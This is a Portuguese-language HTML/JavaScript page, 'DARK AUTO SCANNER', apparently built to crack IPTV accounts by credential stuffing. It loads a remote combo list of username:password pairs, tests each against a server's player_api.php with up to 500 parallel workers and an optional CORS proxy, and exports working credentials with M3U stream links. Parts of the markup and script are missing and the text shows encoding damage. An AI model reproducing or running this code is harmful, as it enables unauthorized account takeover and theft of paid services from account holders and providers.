<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>DARK AUTO SCANNER - TURBO</title>
<style>
  /* ==== VARI√ÅVEIS DE TEMA - TEMA ESCURO + RAIOS ==== */
  :root {
    --bg-color: #0a0a12;
    --bg-gradient: linear-gradient(135deg, #0a0a12 40%, #1a1a27 100%);
    --text-color: #e0e0ff;
    --accent-color: #63e6be;
    --accent-color-light: #a2fff0;
    --error-color: #ff5555;
    --success-color: #49d49d;
    --shadow-color: rgba(0, 200, 255, 0.6);
    --progress-bg: #222;
    --progress-fill: #00ffaa;
    --btn-bg: #12131f;
    --btn-hover-bg: #184846;
    --input-bg: #12131f;
    --input-border: #484848;
    --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  /* Reset e estilos base */
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }
  
  body {
    margin: 0; 
    padding: 0;
    background: var(--bg-gradient);
    color: var(--text-color);
    font-family: var(--font-family);
    min-height: 100vh;
    overflow-x: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%;
  }
  
  /* ===== FUNDO RAIOS ANIMADOS ===== */
  .lightning {
    position: fixed;
    top: 0; 
    left: 0; 
    width: 100vw; 
    height: 100vh;
    pointer-events: none;
    z-index: 0;
    overflow: visible;
  }
  
  .lightning span {
    position: absolute;
    width: 2px; 
    height: 120px;
    background: linear-gradient(180deg, rgba(0,255,255,0.75), transparent);
    filter: drop-shadow(0 0 8px #00fff0);
    opacity: 0;
    animation: lightningAnim 3s linear infinite;
  }
  
  .lightning span:nth-child(1) { left: 10%; animation-delay: 0s; }
  .lightning span:nth-child(2) { left: 25%; animation-delay: 0.8s; }
  .lightning span:nth-child(3) { left: 40%; animation-delay: 1.5s; }
  .lightning span:nth-child(4) { left: 60%; animation-delay: 2.1s; }
  .lightning span:nth-child(5) { left: 75%; animation-delay: 2.7s; }
  
  @keyframes lightningAnim {
    0%, 80%, 100% { opacity: 0; transform: translateY(0); }
    85%, 95% { opacity: 1; transform: translateY(10px); }
  }
  
  /* ===== T√çTULO ANIMADO ===== */
  header {
    margin-top: 20px;
    margin-bottom: 15px;
    font-size: clamp(1.5rem, 5vw, 2.6rem);
    font-weight: 900;
    color: var(--accent-color);
    text-align: center;
    position: relative;
    user-select: none;
    min-height: 3rem;
    width: 100%;
    padding: 0 10px;
  }
  
  /* Typing effect */
  @keyframes typing {
    from { width: 0 }
    to { width: 100% }
  }
  
  @keyframes blinkCaret {
    50% { border-color: transparent; }
  }
  
  .typing {
    white-space: nowrap;
    overflow: hidden;
    border-right: 3px solid var(--accent-color);
    animation:
      typing 3s steps(15, end) forwards,
      blinkCaret 0.8s step-end infinite;
    width: 0;
    margin: 0 auto;
  }
  
  /* Flicker effect */
  @keyframes flicker {
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
      opacity: 1;
      text-shadow:
        0 0 7px var(--accent-color),
        0 0 20px var(--accent-color-light),
        0 0 30px var(--accent-color-light);
    }
    20%, 22%, 24%, 55% {
      opacity: 0.7;
      text-shadow: none;
    }
  }
  
  header.flicker {
    animation: flicker 3s linear infinite;
  }
  
  /* ===== CONTAINER CENTRAL ===== */
  main {
    width: 95%;
    max-width: 900px;
    background: rgba(10,10,18,0.85);
    box-shadow: 0 0 20px var(--shadow-color);
    border-radius: 10px;
    padding: 15px;
    margin-bottom: 20px;
    z-index: 1;
    flex: 1;
    display: flex;
    flex-direction: column;
  }
  
  /* ===== FORMUL√ÅRIO ===== */
  form {
    display: grid;
    grid-template-columns: 1fr;
    gap: 12px;
    align-items: center;
    margin-bottom: 15px;
  }
  
  form label {
    color: var(--accent-color-light);
    font-weight: 600;
    user-select: none;
    margin-bottom: 5px;
    font-size: 0.9rem;
  }
  
  input[type=text], input[type=number], input[type=file], select {
    background: var(--input-bg);
    border: 1px solid var(--input-border);
    color: var(--text-color);
    padding: 10px 12px;
    font-size: 0.95rem;
    border-radius: 6px;
    transition: border-color 0.3s ease;
    width: 100%;
    height: 44px;
  }
  
  input[type=text]:focus, input[type=number]:focus, input[type=file]:focus, select:focus {
    border-color: var(--accent-color);
    outline: none;
  }
  
  input[type=number] {
    max-width: 100%;
  }
  
  .checkbox-container {
    display: flex;
    align-items: flex-start;
    gap: 10px;
    margin-top: 8px;
  }
  
  .checkbox-container input[type="checkbox"] {
    width: auto;
    margin-top: 3px;
    flex-shrink: 0;
  }
  
  .checkbox-container label {
    margin-bottom: 0;
    line-height: 1.3;
  }
  
  /* ==== BOT√ïES ==== */
  button {
    background-color: var(--btn-bg);
    border: none;
    border-radius: 6px;
    padding: 12px 18px;
    color: var(--accent-color);
    font-weight: 700;
    font-size: 1rem;
    cursor: pointer;
    transition: background-color 0.25s ease, box-shadow 0.25s ease;
    box-shadow: 0 0 5px transparent;
    width: 100%;
    height: 44px;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  
  button:hover:not(:disabled) {
    background-color: var(--btn-hover-bg);
    box-shadow: 0 0 12px var(--accent-color);
  }
  
  button:disabled {
    color: #777;
    cursor: not-allowed;
    box-shadow: none;
  }
  
  /* ===== BARRA DE PROGRESSO ===== */
  .progress-container {
    background-color: var(--progress-bg);
    border-radius: 12px;
    box-shadow: inset 0 0 8px #0009;
    overflow: hidden;
    height: 25px;
    margin: 15px 0;
    position: relative;
  }
  
  .progress-bar {
    background: var(--progress-fill);
    height: 100%;
    width: 0%;
    transition: width 0.4s ease;
  }
  
  .progress-text {
    position: absolute;
    right: 10px;
    top: 3px;
    font-weight: 700;
    color: var(--text-color);
    text-shadow: 0 0 4px #000c;
    user-select: none;
    font-size: 0.85rem;
  }
  
  /* ===== ESTAT√çSTICAS ===== */
  .stats {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-around;
    gap: 10px;
    margin-bottom: 20px;
  }
  
  .stat-item {
    background: #112;
    padding: 8px 12px;
    border-radius: 8px;
    min-width: 100px;
    text-align: center;
    color: var(--accent-color-light);
    font-weight: 600;
    font-size: 0.85rem;
    user-select: none;
    box-shadow: 0 0 10px transparent;
    transition: box-shadow 0.3s ease;
    flex: 1;
    min-width: 0;
  }
  
  .stat-item.hit {
    color: var(--success-color);
    box-shadow: 0 0 12px var(--success-color);
  }
  
  .stat-item.error {
    color: var(--error-color);
    box-shadow: 0 0 14px var(--error-color);
  }
  
  /* ===== RESULTADOS ===== */
  .results-container {
    max-height: 300px;
    overflow-y: auto;
    background: #121522ee;
    border-radius: 12px;
    padding: 12px;
    font-family: monospace;
    font-size: 0.8rem;
    color: #a0f0ff;
    user-select: text;
    box-shadow: inset 0 0 8px #00ffeeb5;
    flex: 1;
    min-height: 150px;
  }
  
  /* Cada hit */
  .hit-item {
    background: #002633cc;
    border-radius: 10px;
    margin-bottom: 12px;
    padding: 10px;
    box-shadow: 0 0 10px #00ffff55;
    position: relative;
    transition: background-color 0.3s ease;
  }
  
  .hit-item:hover {
    background: #005564cc;
  }
  
  /* Bot√µes do hit */
  .hit-actions {
    position: absolute;
    top: 6px;
    right: 10px;
  }
  
  .hit-actions button {
    background: transparent;
    border: none;
    color: var(--accent-color-light);
    font-size: 1rem;
    cursor: pointer;
    margin-left: 8px;
    transition: color 0.3s ease;
    padding: 2px 6px;
    border-radius: 6px;
    width: auto;
    height: auto;
  }
  
  .hit-actions button:hover {
    color: var(--success-color);
  }
  
  /* BOT√ïES GERAIS DE CONTROLE */
  .controls {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 10px;
    margin-top: 15px;
  }
  
  /* NOTIFICA√á√ÉO */
  #notification {
    position: fixed;
    bottom: 25px;
    left: 50%;
    transform: translateX(-50%);
    background: var(--accent-color);
    padding: 12px 20px;
    border-radius: 8px;
    box-shadow: 0 0 20px var(--accent-color-light);
    color: #021212;
    font-weight: 700;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.5s ease;
    z-index: 1000;
    user-select: none;
    max-width: 90%;
    text-align: center;
    font-size: 0.9rem;
  }
  
  #notification.show {
    opacity: 1;
    pointer-events: auto;
  }
  
  /* Rodap√© */
  footer {
    width: 100%;
    text-align: center;
    padding: 15px 0;
    color: var(--accent-color-light);
    font-size: 0.9rem;
    font-weight: 600;
    margin-top: auto;
    z-index: 1;
  }
  
  /* RESPONSIVO */
  @media (min-width: 601px) {
    form {
      grid-template-columns: 1fr 1fr;
    }
    
    .controls {
      grid-template-columns: repeat(5, 1fr);
    }
    
    button {
      width: auto;
    }
    
    .results-container {
      max-height: 450px;
      font-size: 0.88rem;
    }
    
    .stats {
      gap: 15px;
    }
    
    .stat-item {
      min-width: 120px;
      font-size: 1rem;
      padding: 10px 15px;
    }
    
    input[type=number] {
      max-width: 100px;
    }
    
    main {
      padding: 20px 25px;
    }
    
    header {
      margin-top: 40px;
      margin-bottom: 20px;
    }
  }
  
  @media (max-width: 360px) {
    .controls {
      grid-template-columns: 1fr;
    }
    
    .stats {
      flex-direction: column;
      gap: 8px;
    }
    
    .stat-item {
      min-width: 100%;
    }
    
    .results-container {
      max-height: 200px;
      font-size: 0.75rem;
    }
    
    header {
      font-size: 1.3rem;
      margin-top: 15px;
      margin-bottom: 10px;
    }
  }
</style>

  // Fun√ß√£o para mostrar notifica√ß√£o visual e sonora
  function showNotification(msg, duration = 5000) {
    notification.textContent = msg;
    notification.classList.add('show');
    try {
      const audioCtx = new AudioContext();
      const oscillator = audioCtx.createOscillator();
      oscillator.type = 'triangle';
      oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
      oscillator.connect(audioCtx.destination);
      oscillator.start();
      oscillator.stop(audioCtx.currentTime + 0.15);
    } catch {}
    setTimeout(() => {
      notification.classList.remove('show');
    }, duration);
  }

  // ===== UTILIDADES DE FORMATA√á√ÉO =====
  function formatDate(dateStr) {
    if(!dateStr) return 'Desconhecida';
    // Se √© timestamp (segundos)
    if(/^\d+$/.test(dateStr)) {
      return new Date(parseInt(dateStr) * 1000).toLocaleDateString('pt-BR');
    }
    // Tenta Date normal
    const d = new Date(dateStr);
    if(isNaN(d)) return 'Desconhecida';
    return d.toLocaleDateString('pt-BR');
  }
  
  // Escapa HTML para preven√ß√£o simples de injection
  function escapeHtml(text) {
    return text.replace(/[&<>"']/g, function(m) {
      return {'&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;'}[m];
    });
  }
  
  // ===== FUN√á√ÉO PARA CARREGAR COMBOS ONLINE =====
  async function loadCombosOnline() {
    try {
      // URL corrigida para acessar o arquivo raw do GitHub
      const response = await fetch('https://raw.githubusercontent.com/guedescomvc2025-bot/COMBO-DARK-ONLINE/main/todos_combos.txt');
      if (!response.ok) {
        throw new Error(`Erro ao carregar combos: ${response.status}`);
      }
      const text = await response.text();
      let lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
      combos = lines.filter(l => l.includes(':')); // m√≠nimo username:password
      showNotification(`${combos.length} combos carregados online.`);
      return true;
    } catch (error) {
      showNotification(`Erro ao carregar combos: ${error.message}`);
      console.error('Erro ao carregar combos:', error);
      return false;
    }
  }
  
  // ===== FUN√á√ÉO PRINCIPAL DE TESTE DE COMBO =====
  async function testCombo(host, username, password, attempt = 0) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000); // Timeout aumentado para 20s
    
    // Garantir que o host tenha o prefixo http://
    let formattedHost = host;
    if (!host.startsWith('http://') && !host.startsWith('https://')) {
      formattedHost = 'http://' + host;
    }
    
    // URL base da API
    const baseUrl = `${formattedHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
    const userInfoUrl = `${baseUrl}&action=get_user_info`;
    
    try {
      // Verificar se deve usar proxy
      const useProxy = useProxyCheckbox.checked;
      const proxyUrl = useProxy ? 'https://corsproxy.io/?' : '';
      
      // Fazer requisi√ß√£o para obter informa√ß√µes do usu√°rio
      const userInfoResponse = await fetch(proxyUrl + userInfoUrl, {
        signal: controller.signal,
        headers: { 'Accept': 'application/json' },
        cache: 'no-store'
      });
      
      clearTimeout(timeoutId);
      
      // Verificar se a resposta foi bem-sucedida
      if (!userInfoResponse.ok) {
        throw new Error(`HTTP error! status: ${userInfoResponse.status}`);
      }
      
      // Parsear os dados
      const userInfo = await userInfoResponse.json();
      
      // Verificar se o usu√°rio est√° ativo
      if (userInfo && userInfo.user_info && userInfo.user_info.status === 'Active') {
        // Contar canais e categorias
        let liveCount = 0;
        let movieCount = 0;
        let seriesCount = 0;
        
        // Tentar obter mais informa√ß√µes se dispon√≠veis
        try {
          const liveStreamsUrl = `${baseUrl}&action=get_live_streams`;
          const liveCategoriesUrl = `${baseUrl}&action=get_live_categories`;
          const vodCategoriesUrl = `${baseUrl}&action=get_vod_categories`;
          const seriesCategoriesUrl = `${baseUrl}&action=get_series_categories`;
          
          const [liveStreamsResponse, liveCategoriesResponse, vodCategoriesResponse, seriesCategoriesResponse] = await Promise.all([
            fetch(proxyUrl + liveStreamsUrl, {
              signal: controller.signal,
              headers: { 'Accept': 'application/json' },
              cache: 'no-store'
            }),
            fetch(proxyUrl + liveCategoriesUrl, {
              signal: controller.signal,
              headers: { 'Accept': 'application/json' },
              cache: 'no-store'
            }),
            fetch(proxyUrl + vodCategoriesUrl, {
              signal: controller.signal,
              headers: { 'Accept': 'application/json' },
              cache: 'no-store'
            }),
            fetch(proxyUrl + seriesCategoriesUrl, {
              signal: controller.signal,
              headers: { 'Accept': 'application/json' },
              cache: 'no-store'
            })
          ]);
          
          if (liveStreamsResponse.ok) {
            const liveStreams = await liveStreamsResponse.json();
            liveCount = Array.isArray(liveStreams) ? liveStreams.length : 0;
          }
          
          if (vodCategoriesResponse.ok) {
            const vodCategories = await vodCategoriesResponse.json();
            movieCount = Array.isArray(vodCategories) ? vodCategories.length : 0;
          }
          
          if (seriesCategoriesResponse.ok) {
            const seriesCategories = await seriesCategoriesResponse.json();
            seriesCount = Array.isArray(seriesCategories) ? seriesCategories.length : 0;
          }
        } catch (e) {
          // Ignorar erros ao obter categorias e streams
          console.log("Erro ao obter informa√ß√µes adicionais:", e);
        }
        
        const expirationDate = userInfo.user_info.exp_date ?
          new Date(parseInt(userInfo.user_info.exp_date) * 1000).toLocaleDateString('pt-BR') :
          'Desconhecida';
          
        return {
          valid: true,
          username,
          password,
          host: formattedHost,
          status: userInfo.user_info.status,
          expiration: expirationDate,
          created_at: userInfo.user_info.created_at || '',
          maxConnections: userInfo.user_info.max_connections || 'Desconhecido',
          m3uLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
          m3uPlusLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
          enigmaLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=enigma`,
          epgUrl: `${formattedHost}/epg.xml`, // supondo padr√£o
          counts: {
            live: liveCount,
            movies: movieCount,
            series: seriesCount,
            total: liveCount + movieCount + seriesCount
          },
          data: userInfo
        };
      } else {
        return { valid: false };
      }
    } catch (error) {
      clearTimeout(timeoutId);
      // Retry inteligente para erros transit√≥rios
      if (attempt < MAX_RETRIES && !stopRequested) {
        await delay(500);
        return testCombo(host, username, password, attempt + 1);
      }
      return { valid: false, error: error.message || 'Erro desconhecido' };
    }
  }

  // ===== INICIA O ESCANEAMENTO =====
  async function startScan() {
    // Reseta estado
    stopRequested = false;
    totalProcessed = 0;
    totalErrors = 0;
    totalHits = 0;
    workerPool = 0;
    resultsHits = [];
    resultsSet.clear();
    resultsContainer.innerHTML = '';
    updateStats();
    updateProgress();
    
    // Leitura inputs
    const serverInput = document.getElementById('serverSelect').value.trim();
    if(!serverInput) {
      alert('Selecione um servidor.');
      return;
    }
    
    maxWorkers = parseInt(document.getElementById('threadCount').value, 10);
    if(isNaN(maxWorkers) || maxWorkers < 1 || maxWorkers > 500) {
      alert('Informe um n√∫mero v√°lido de bots (1 a 500).');
      return;
    }
    
    if(combos.length === 0) {
      const loaded = await loadCombosOnline();
      if (!loaded) return;
    }
    
    startBtn.disabled = true;
    stopBtn.disabled = false;
    exportBtn.disabled = true;
    copyAllBtn.disabled = true;
    startTime = Date.now();
    lastUpdateTime = Date.now();
    
    // Gera v√°rias "workers" que buscam combos da lista
    workerPool = maxWorkers;
    const promises = [];
    for(let i=0; i < maxWorkers; i++) {
      promises.push(worker(serverInput));
    }
    await Promise.all(promises);
    
    // Finalizado
    workerPool = 0;
    updateStats();
    updateProgress();
    startBtn.disabled = false;
    stopBtn.disabled = true;
    exportBtn.disabled = resultsHits.length === 0;
    copyAllBtn.disabled = resultsHits.length === 0;
    showNotification(`Varredura finalizada! Hits encontrados: ${totalHits}`, 7000);
  }
  
  // ===== WORKER QUE PEGA PROXIMO ITEM PARA TESTAR =====
  async function worker(host) {
    while(!stopRequested) {
      let comboItem;
      // Pega pr√≥ximo combo de forma thread-safe
      if(combos.length > 0) {
        comboItem = combos.shift();
      } else {
        break;
      }
      if(!comboItem) break;
      
      // Quebra username e password conforme padr√£o "username:password"
      let [username, password] = comboItem.split(':');
      if(!username || !password) {
        totalErrors++;
        totalProcessed++;
        updateStatsIfNeeded();
        continue;
      }
      
      try {
        const res = await testCombo(host, username, password);
        totalProcessed++;
        if (res.valid) {
          // Evitar duplicidade: combo + host como chave √∫nica
          const uniqueKey = `${host}|${username}|${password}`;
          if(!resultsSet.has(uniqueKey)) {
            resultsSet.add(uniqueKey);
            totalHits++;
            resultsHits.push(res);
            // Renderizar na UI
            const hitHTML = renderHit(res, totalHits);
            resultsContainer.prepend(hitHTML);
          }
        } else {
          totalErrors++;
        }
      } catch (e) {
        totalErrors++;
      }
      updateStatsIfNeeded();
      
      // Delay ajust√°vel baseado no modo turbo
      const turboMode = turboModeCheckbox.checked;
      if (turboMode) {
        await delay(10); // Delay m√≠nimo no modo turbo
      } else {
        await delay(50); // Delay padr√£o
      }
    }
  }
  
  // ===== ATUALIZA√á√ÉO OTIMIZADA DE ESTAT√çSTICAS =====
  function updateStatsIfNeeded() {
    const now = Date.now();
    // Atualiza a cada 200ms ou a cada 100 requisi√ß√µes processadas
    if (now - lastUpdateTime > 200 || totalProcessed % 100 === 0) {
      updateStats();
      updateProgress();
      lastUpdateTime = now;
    }
  }

  function clearResults() {
    stopRequested = true;
    combos = [];
    resultsHits = [];
    resultsSet.clear();
    resultsContainer.innerHTML = '';
    totalProcessed = 0;
    totalErrors = 0;
    totalHits = 0;
    updateStats();
    updateProgress();
    startBtn.disabled = false;
    stopBtn.disabled = true;
    exportBtn.disabled = true;
    copyAllBtn.disabled = true;
  }

        content.push(`üé• FILMES: ${h.counts.movies}`);
        content.push(`üéûÔ∏è S√âRIES: ${h.counts.series}`);
        content.push(`üî¢ TOTAL: ${h.counts.total}`);
      }
      
      content.push('--------------------------------');
      content.push(`üîó M3U: ${h.m3uLink}`);
      content.push(`üîó M3U+: ${h.m3uPlusLink}`);
      content.push(`üîó ENIGMA: ${h.enigmaLink}`);
      content.push(`üîó EPG: ${h.epgUrl}`);
      content.push('--------------------------------');
      content.push('‚úÖ DARK AUTO SCANNER ‚úÖ');
      
      lines.push(content.join('\n'));
    }
    
    const blob = new Blob([lines.join('\n\n')], {type: "text/plain;charset=utf-8"});
    const url = URL.createObjectURL(blob);
    // Criar link para download
    const a = document.createElement('a');
    a.href = url;
    a.download = `hits-dark-scanner-${new Date().toISOString().slice(0,10)}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  }
  
  // ===== COPIAR TODOS OS HITS =====
  function copyAllHits() {
    if (resultsHits.length === 0) {
      alert('Nenhum hit para copiar.');
      return;
    }
    
    const showFullInfo = showCategoryCheckbox.checked;
    const texts = resultsHits.map(h => {
      const content = [];
      content.push(`‚úÖ HIT DETECTADO pelo DARK AUTO SCANNER`);
      content.push('--------------------------------');
      content.push(`‚ö° SINAL: ATIVO`);
      content.push(`üåê SERVIDOR: ${h.host}`);
      content.push(`üë§ USU√ÅRIO: ${h.username}`);
      content.push(`üîë SENHA: ${h.password}`);
      
      if (showFullInfo) {
        content.push(`üìÖ REGISTRO: ${formatDate(h.created_at)}`);
        content.push(`‚åõ VALIDADE: ${h.expiration}`);
        content.push('--------------------------------');
        content.push(`üì∫ CANAIS: ${h.counts.live}`);
        content.push(`üé• FILMES: ${h.counts.movies}`);
        content.push(`üéûÔ∏è S√âRIES: ${h.counts.series}`);
        content.push(`üî¢ TOTAL: ${h.counts.total}`);
      }
      
      content.push('--------------------------------');
      content.push(`üîó M3U: ${h.m3uLink}`);
      content.push(`üîó M3U+: ${h.m3uPlusLink}`);
      content.push(`üîó ENIGMA: ${h.enigmaLink}`);
      content.push(`üîó EPG: ${h.epgUrl}`);
      content.push('--------------------------------');
      content.push('‚úÖ DARK AUTO SCANNER ‚úÖ');
      
      return content.join('\n');
    }).join('\n\n');
    
    navigator.clipboard.writeText(texts).then(() => {
      showNotification('Todos os hits foram copiados!');
    }).catch(() => alert('Falha ao copiar.'));
  }
  
  // ===== EVENT LISTENERS =====
  startBtn.addEventListener('click', async () => {
    if(combos.length === 0) {
      const loaded = await loadCombosOnline();
      if (!loaded) return;
    }
    startScan();
  });
  
  stopBtn.addEventListener('click', () => {
    stopRequested = true;
    stopBtn.disabled = true;
    startBtn.disabled = false;
    showNotification('Escaneamento interrompido pelo usu√°rio.');
  });
  
  clearBtn.addEventListener('click', () => {
    clearResults();
    showNotification('Resultados limpos.');
  });
  
  exportBtn.addEventListener('click', exportHits);
  copyAllBtn.addEventListener('click', copyAllHits);
  
  // Carrega combos automaticamente ao iniciar
  window.addEventListener('load', async () => {
    await loadCombosOnline();
  });
  
  // ===== ACESSIBILIDADE =====
  // Define foco no container de resultados para leitores de tela
  resultsContainer.setAttribute('tabindex', '0');
  // ===== FIM DO SCRIPT =====
</script>
